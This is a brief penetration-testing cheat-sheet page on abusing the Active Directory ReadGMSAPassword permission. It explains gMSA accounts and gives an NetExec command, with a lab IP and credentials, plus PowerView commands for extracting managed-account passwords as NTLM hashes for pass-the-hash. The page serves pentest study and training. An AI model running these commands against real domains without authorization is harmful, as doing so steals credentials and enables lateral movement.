# ReadGMSAPassword

## <mark style="color:$primary;">ABOUT</mark>

<mark style="color:red;">**Group Managed Service Accounts (gMSA)**</mark> are an Active Directory feature designed to run automated services. Their highly complex, <mark style="color:yellow;">**120-character passwords are automatically generated**</mark> and rotated by the Domain Controller.

This attack targets the `ReadGMSAPassword` Access Control Entry (ACE).

When an authorized machine needs to run a service, it requests the password from the Domain Controller to authenticate. If we compromise a principal (such as a computer account) holding this permission, we can query LDAP for the msDS-ManagedPassword attribute.

> gMSA passwords are not cracked; they are extracted. The raw binary blob is converted locally into an NTLM hash for Pass-the-Hash (PtH).

#### Requirements

We can extract gMSA hashes if the following conditions are met (creds / ticket are must-have):

* Credentials, hash, or Kerberos ticket for an account with `ReadGMSAPassword` rights over the target gMSA.
* Network access to LDAP (Port 389/636) on the Domain Controller.

## <mark style="color:$primary;">LINUX</mark>

### <mark style="color:green;">NetExec</mark>

> NetExec automatically parses the msDS-ManagedPassword blob and calculates the clean NTLM hash.

**Extract gMSA Passwords**

```bash
nxc ldap 10.129.244.95 -u 'MS01$' -p 'ms01' -k --gmsa
```

_(Can be executed with cleartext passwords, NTLM hashes (`-H`), or Kerberos tickets (`-k`))_

## <mark style="color:$primary;">WINDOWS</mark>

### <mark style="color:green;">PowerView</mark>

**Read gMSA Password Blob**

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> Get-DomainManagedSecurityAccount | select samaccountname
```

## <mark style="color:$primary;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword" %}
